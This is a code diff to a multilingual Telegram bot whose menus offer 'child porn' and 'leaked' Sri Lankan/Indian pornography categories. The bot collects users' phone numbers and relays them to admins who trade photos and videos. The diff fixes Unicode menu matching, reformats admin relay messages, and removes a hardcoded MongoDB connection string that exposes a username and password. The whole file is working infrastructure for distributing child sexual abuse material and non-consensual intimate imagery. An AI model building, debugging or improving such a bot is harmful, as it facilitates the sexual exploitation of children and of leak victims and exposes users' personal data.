@@ -1,6 +1,7 @@
 import logging
 import os
 import re
+import unicodedata
 from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
 from telegram.ext import (
     Application,
@@ -21,7 +22,7 @@ logger = logging.getLogger(__name__)
 PHONE_REQUEST, LANGUAGE_SELECTION, MAIN_MENU, CATEGORY_REDIRECTION = range(4)
 
 # MongoDB setup
-MONGO_URI = "mongodb+srv://bobytel:qwertym@telestring.8zliit3.mongodb.net/?appName=telestring"
+MONGO_URI = os.getenv("MONGO_URI", "YOUR_MONGODB_ATLAS_CONNECTION_STRING")
 try:
     client = MongoClient(MONGO_URI)
     client.admin.command('ping')
@@ -43,29 +44,29 @@ class AdminFilter(filters.MessageFilter):
 # Menu texts for each language
 MENUS = {
     'en': {
-        'welcome': "Welcome to our network! Please choose a category or exit.",
+        'welcome': "Welcome to our bot! Please choose a category or exit.",
         'category1': "Sri Lankan/Indian Leak P0RN",
         'category2': "CH!1D P0RN",
         'exit': "Exit",
         'admin_message': "New user chat initiated.\nUser phone: `{phone}`\nUser ID: `{user_id}`",
         'chat_closed': "Chat has been closed by admin.",
         'select_language': "Please select your language:",
-        'phone_prompt': "ONLY 18+ ADULTS ALLOWED TO JOIN THIS NETWORK. PRESS BUTTON BELOWE 👇👇👇👇",
+        'phone_prompt': "ONLY 18+ ADULTS ALLOWED TO JOIN THIS NETWORK.",
         'phone_denied': "YOU MUST ALLOW TO SHARE YOUR AGE TO JOIN THIS NETWORK. Please try again with /start..",
-        'share_button': "⭕️ IAM 18+ ADULT 🙋‍♂️⭕️",
+        'share_button': "IAM 18+ ADULT",
         'db_error': "Sorry, we're experiencing database issues. Please try again later."
     },
     'si': {
-        'welcome': "අපගේ සමූහය වෙත සාදරයෙන් පිළිගනිමු! කරුණාකර කාණ්ඩයක් තෝරන්න හෝ පිටවන්න.",
-        'category1': "Sri Lanka/India ලීක් වීඩියෝ ",
+        'welcome': "අපගේ බොට් වෙත සාදරයෙන් පිළිගනිමු! කරුණාකර කාණ්ඩයක් තෝරන්න හෝ පිටවන්න.",
+        'category1': "‍‍ලංකාවේ/ඉන්දියාවේ ලීක් වීඩියෝ ",
         'category2': "ළමා වීඩියෝ",
         'exit': "පිටවීම",
         'admin_message': "නව පරිශීලක චැට් ආරම්භ විය.\nපරිශීලක දුරකථනය: `{phone}`\nUser ID: `{user_id}`",
         'chat_closed': "චැට් ඇඩ්මින් විසින් වසා ඇත.",
         'select_language': "කරුණාකර ඔබේ භාෂාව තෝරන්න:",
-        'phone_prompt': "ඉදිරියට යාම, වයස 18+ වැඩිහිටියන්ට පමණකි පහල බොත්තම ඔබන්න 👇👇👇👇.",
+        'phone_prompt': "ඉදිරියට යාම, වයස 18+ වැඩිහිටියන්ට පමණකි.",
         'phone_denied': "ඔබ ඉදිරියට යාමට ඔබගේ සත්‍ය වයස අප හා බෙදාගැනීමට එකඟ වියයුතුමය. කරුණාකර /start සමඟ නැවත උත්සාහ කරන්න.",
-        'share_button': "⭕️ මම 18+ වැඩිහිටියෙක්මි 🙋‍♂️⭕️ ",
+        'share_button': "මම 18+ වැඩිහිටියෙක්මි",
         'db_error': "කණගාටුයි, අපට දත්ත සමුදා ගැටළු ඇත. කරුණාකර පසුව නැවත උත්සාහ කරන්න."
     },
     'hi': {
@@ -78,7 +79,7 @@ MENUS = {
         'select_language': "कृपया अपनी भाषा चुनें:",
         'phone_prompt': "कार्यवाही केवल 18+ आयु वर्ग के वयस्कों के लिए है।",
         'phone_denied': "जारी रखने के लिए आपको अपनी वास्तविक आयु हमसे साझा करने की सहमति देनी होगी। कृपया /start के साथ पुनः प्रयास करें",
-        'share_button': "⭕️ मैं 18+ आयु का वयस्क हूं। 🙋‍♂️⭕️",
+        'share_button': "मैं 18+ आयु का वयस्क हूं।",
         'db_error': "क्षमा करें, हमें डेटाबेस समस्याएँ आ रही हैं। कृपया बाद में पुनः प्रयास करें।"
     }
 }
@@ -171,6 +172,7 @@ async def select_language(update: Update, context: CallbackContext) -> int:
         keyboard = [[menu['category1'], menu['category2']], [menu['exit']]]
         reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
         await update.message.reply_text(menu['welcome'], reply_markup=reply_markup)
+        logger.info(f"User {user_id} selected language {lang_code}, menu options: {[menu['category1'], menu['category2'], menu['exit']]}")
         return MAIN_MENU
     except OperationFailure as e:
         logger.error(f"MongoDB operation failed in select_language for user {user_id}: {e}")
@@ -186,6 +188,9 @@ async def main_menu(update: Update, context: CallbackContext) -> int:
     """Handle main menu options: redirect to admin or exit."""
     user_id = update.effective_user.id
     choice = update.message.text
+    # Normalize input to handle encoding/whitespace issues
+    choice_normalized = unicodedata.normalize('NFKC', choice.strip())
+    logger.info(f"User {user_id} selected: '{choice}' (normalized: '{choice_normalized}')")
     
     try:
         user = users_collection.find_one({'user_id': user_id})
@@ -195,12 +200,19 @@ async def main_menu(update: Update, context: CallbackContext) -> int:
         
         lang = user['language']
         menu = MENUS[lang]
+        # Normalize menu options for comparison
+        valid_options = [
+            unicodedata.normalize('NFKC', menu['category1'].strip()),
+            unicodedata.normalize('NFKC', menu['category2'].strip()),
+            unicodedata.normalize('NFKC', menu['exit'].strip())
+        ]
+        logger.info(f"Valid options for lang {lang}: {valid_options}")
         
-        if choice == menu['exit']:
+        if choice_normalized == unicodedata.normalize('NFKC', menu['exit'].strip()):
             await update.message.reply_text("Thank you for using our bot!", reply_markup=ReplyKeyboardRemove())
             return ConversationHandler.END
         
-        if choice in [menu['category1'], menu['category2']]:
+        if choice_normalized in [unicodedata.normalize('NFKC', menu['category1'].strip()), unicodedata.normalize('NFKC', menu['category2'].strip())]:
             admin_id = admin_ids[user_id % len(admin_ids)]
             active_chats_collection.update_one(
                 {'user_id': user_id},
@@ -213,6 +225,7 @@ async def main_menu(update: Update, context: CallbackContext) -> int:
             return CATEGORY_REDIRECTION
         else:
             await update.message.reply_text("Please select a valid option.")
+            logger.warning(f"Invalid option selected by user {user_id}: '{choice_normalized}' not in {valid_options}")
             return MAIN_MENU
     except OperationFailure as e:
         logger.error(f"MongoDB operation failed in main_menu for user {user_id}: {e}")
@@ -237,19 +250,19 @@ async def forward_to_admin(update: Update, context: CallbackContext) -> None:
             if update.message.text:
                 await context.bot.send_message(
                     chat_id=admin_id,
-                    text=f"From user `{user['phone']}`: {update.message.text}\nUser ID: `{user_id}`"
+                    text=f"From user: `{user['phone']}`\nMessage: {update.message.text}\nID: `{user_id}`"
                 )
             elif update.message.photo:
                 await context.bot.send_photo(
                     chat_id=admin_id,
                     photo=update.message.photo[-1].file_id,
-                    caption=f"From user `{user['phone']}`\nUser ID: `{user_id}`"
+                    caption=f"From user: `{user['phone']}`\nID: `{user_id}`"
                 )
             elif update.message.video:
                 await context.bot.send_video(
                     chat_id=admin_id,
                     video=update.message.video.file_id,
-                    caption=f"From user `{user['phone']}`\nUser ID: `{user_id}`"
+                    caption=f"From user: `{user['phone']}`\nID: `{user_id}`"
                 )
         else:
             await update.message.reply_text("No active admin session. Please select a category from the main menu.")
@@ -275,7 +288,7 @@ async def admin_reply(update: Update, context: CallbackContext) -> None:
         if update.message.reply_to_message:
             replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
             logger.info(f"Replied-to message text: {replied_text}")
-            user_id_match = re.search(r"User ID: `(\d+)`", replied_text)
+            user_id_match = re.search(r"ID: `(\d+)`", replied_text)
             if not user_id_match:
                 logger.warning(f"Failed to extract user_id from replied message: {replied_text}")
                 await update.message.reply_text("Could not identify user. Please use /reply <user_id> <message>.")
